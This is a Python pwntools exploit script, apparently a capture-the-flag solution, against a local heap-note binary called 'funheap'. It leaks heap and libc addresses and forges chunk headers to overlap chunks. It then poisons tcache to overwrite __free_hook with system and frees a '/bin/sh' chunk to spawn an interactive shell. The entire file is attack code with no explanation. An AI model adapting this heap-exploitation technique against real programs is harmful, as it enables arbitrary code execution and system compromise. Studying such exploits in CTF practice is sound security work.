#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./funheap')

def add(Size):
  p.sendlineafter('CMD >>', str('1'))
  p.sendlineafter('Size:', str(Size))

def delete(idx):
  p.sendlineafter('CMD >>', str('2'))
  p.sendlineafter('Index:', str(idx))

def show(idx):
  p.sendlineafter('CMD >>', str('3'))
  p.sendlineafter('ndex:', str(idx))

def edit(idx, payload):
  p.sendlineafter('CMD >>', str('4'))
  p.sendlineafter('Index:', str(idx))
  p.sendafter('Note:', payload)
 
if __name__ == "__main__":
  add(0x18)
  add(0x18)
  delete(0)
  delete(1)
  add(0x18)
  show(0)
  p.recvuntil('Note:')
  heap = u64(p.recv(6).ljust(8, '\x00'))
  heapbase = heap & 0xfffffffff000
  randoffset = heap - heapbase - 0x10
  if randoffset < 0x290:
    heapbase -= 0x1000
    randoffset = heap - heapbase - 0x10
  success('BASE:  \t' + str(hex(heapbase)))
  success('HEAP:  \t' + str(hex(heap)))
  success('OFFSET:\t' + str(hex(randoffset)))

  delete(0)
  for i in range(7):
    add(0x0f8)
  add(0x4f0)
  add(0x20)
  delete(7)
  add(0x4f0)
  show(7)
  p.recvuntil('Note:')
  libc = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x1ebbe0
  success('LIBC:\t' + str(hex(libc)))
  __malloc_hook = libc + 0x1ebb70
  system = libc + 0x55410
  __free_hook = libc + 0x1eeb28

  ptr = heap + 0x550 + 0x20
  payload = p64(0) * 2
  payload += p64(0) + p64(0x1e0)
  payload += p64(ptr - 0x18) + p64(ptr - 0x10)
  payload += p64(ptr - 0x20) + '\n'
  edit(5, payload)
  payload = 'a' * 0xf0 + p64(0x1e0)
  edit(6, payload)
  delete(7)

  for i in range(5):
    delete(i)
  delete(6)
  add(0x600)
  payload = 'a' * 0xd0 + p64(0) + p64(0x101) + p64( __free_hook) + '\n'
  edit(0, payload)
  add(0xf8)
  add(0xf8)
  payload = p64(system)
  edit(2, payload + '\n')
  edit(1, '/bin/sh\x00\n')
  delete(1)

  success('BASE:  \t' + str(hex(heapbase)))
  success('HEAP:  \t' + str(hex(heap)))
  success('OFFSET:\t' + str(hex(randoffset)))
  success('LIBC:  \t' + str(hex(libc)))
  gdb.attach(p)
  p.interactive()